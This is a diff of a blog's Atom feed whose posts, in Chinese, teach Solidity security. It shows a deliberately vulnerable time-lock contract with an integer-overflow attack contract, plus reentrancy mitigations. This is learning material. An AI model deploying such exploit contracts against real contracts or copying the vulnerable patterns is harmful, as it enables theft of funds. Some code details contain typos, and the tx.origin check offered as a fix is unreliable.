@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://marknft.github.io</id>
     <title>Mark World</title>
-    <updated>2022-05-05T08:46:24.944Z</updated>
+    <updated>2022-05-10T05:07:03.083Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://marknft.github.io"/>
     <link rel="self" href="https://marknft.github.io/atom.xml"/>
@@ -10,7 +10,88 @@
     <icon>https://marknft.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, Mark World</rights>
     <entry>
-        <title type="html"><![CDATA[智能合约Solidity安全①-重入攻击]]></title>
+        <title type="html"><![CDATA[智能合约Solidity安全②-数字溢出攻击Overflow]]></title>
+        <id>https://marknft.github.io/post/SoliditySecurity-2/</id>
+        <link href="https://marknft.github.io/post/SoliditySecurity-2/">
+        </link>
+        <updated>2022-05-10T04:28:30.000Z</updated>
+        <summary type="html"><![CDATA[<pre><code>数字溢出会出现不可意料的风险
+</code></pre>
+]]></summary>
+        <content type="html"><![CDATA[<pre><code>数字溢出会出现不可意料的风险
+</code></pre>
+<!-- more -->
+<h2 id="正文">正文</h2>
+<p>因为solidity的unit数字类型默认有范围，会有上下溢出风险</p>
+<pre><code>unit unit256
+0 &lt;= x &lt;=2**256 -1 
+// 2**256 -1 +1 = 0
+</code></pre>
+<h3 id="溢出代码案例">溢出代码案例:</h3>
+<p>默认存储金额一周后可取出，使用攻击数字溢出，可以现存现取</p>
+<pre><code>pragma solidity ^0.6.10;
+
+contract TimeLock {
+    mapping(address =&gt; uint) public balances;
+    mapping(address =&gt; uint) public lockTime;
+
+    function deposit() external payable {
+        balances[msg.sender] +=msg.value;
+        lockTime[msg.sender] = now + 1 weeks;
+    }
+
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+
+    function withdraw() public {
+        require(balances[msg.sender] &gt; 0, &quot;Insufficient funds&quot;);
+        require(now &gt; lockTime[msg.sender], &quot;Lock time not expired&quot;);
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+    
+        (bool sent, ) = msg.sender.call{value: amount}(&quot;&quot;);
+        require(sent, &quot;Failed to send Ether&quot;);
+    }
+
+}
+
+contract Attack {
+    TimeLock timeLock;
+
+    constructor(TimeLock _timeLock) public {
+        timeLock = TimeLock(_timeLock);
+    }
+    fallback() external payable {}
+
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        timeLock.increaseLockTime(
+            uint(-timeLock.lockTime(address(this)))
+        );
+        timeLock.withdraw();
+    }
+}
+</code></pre>
+<h3 id="解决方案">解决方案：</h3>
+<ul>
+<li>
+<p>使用SafeMath库保护<br>
+using SafeMath for unit;</p>
+<hr>
+</li>
+</ul>
+<blockquote>
+<p>这里是记录学习分享的内容，不定时发布。</p>
+</blockquote>
+<p><strong>封面图</strong><br>
+<img src="https://marknft.github.io/post-images/1652159100742.jpg" alt="" loading="lazy"><br>
+<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">欢迎订阅我的Youtube频道</a></p>
+<p>(完)</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[智能合约Solidity安全①-重入攻击Reentrancy]]></title>
         <id>https://marknft.github.io/post/SoliditySecurity-1/</id>
         <link href="https://marknft.github.io/post/SoliditySecurity-1/">
         </link>
@@ -22,15 +103,15 @@
 </code></pre>
 <!-- more -->
 <h2 id="正文">正文</h2>
-<p>事件逻辑图：<br>
+<p>Reentancy Attack逻辑图：<br>
 <img src="https://marknft.github.io/post-images/1651738714317.jpg" alt="" loading="lazy"></p>
 <h3 id="全程使用使用remix在线编辑器此次操作出现的问题如下">全程使用使用Remix在线编辑器，此次操作出现的问题如下：</h3>
 <ol>
 <li>代码大小写规范，单词拼写不能出现错漏</li>
-<li>部署攻击合约需使用合约B(至于为啥？先记忆后理解)</li>
+<li>部署攻击合约需使用合约B(合约的方法继承)</li>
 <li>注意存取款数字和单位</li>
 </ol>
-<h3 id="代码如下">代码如下：</h3>
+<h3 id="reentancy-attack代码如下">Reentancy Attack代码如下：</h3>
 <pre><code>pragma solidity ^ 0.6.10;
 
 contract EtherStore {
@@ -70,6 +151,20 @@ contract Attack{
     }
 }
 </code></pre>
+<h3 id="解决方案">解决方案</h3>
+<ul>
+<li>先减少账户余额(状态)再转帐</li>
+<li>重入锁，设置状态变量<br>
+bool internal locked;<br>
+modifier no Reentrant(){<br>
+require(!locked, &quot;No re-entrancy&quot;);<br>
+locked =true;<br>
+_;<br>
+locked = false<br>
+}</li>
+<li>判断不可为可约地址(此方案只在本代码中测试通过)<br>
+require (msg.sender == tx.origin, &quot;not user address&quot; );</li>
+</ul>
 <hr>
 <blockquote>
 <p>这里是记录学习分享的内容，不定时发布。</p>
